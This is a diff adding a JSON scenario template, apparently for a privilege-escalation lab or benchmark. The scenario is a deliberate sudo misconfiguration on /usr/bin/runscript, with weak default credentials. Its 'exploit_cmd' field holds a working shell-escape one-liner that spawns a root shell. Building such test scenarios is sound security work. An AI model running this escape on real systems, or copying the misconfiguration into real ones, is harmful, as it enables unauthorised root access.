@@ -1,0 +1,31 @@
+{
+  "template_id": "auto_T1548_003_sudo_runscript",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "sudo misconfiguration allows running /usr/bin/runscript as root, enabling shell",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "dedup_group": "sudo_script_shell_escape",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "T1548_003_sudo_runscript",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ],
+  "exploit_cmd": "echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file",
+  "binary_path": "/usr/bin/runscript"
+}
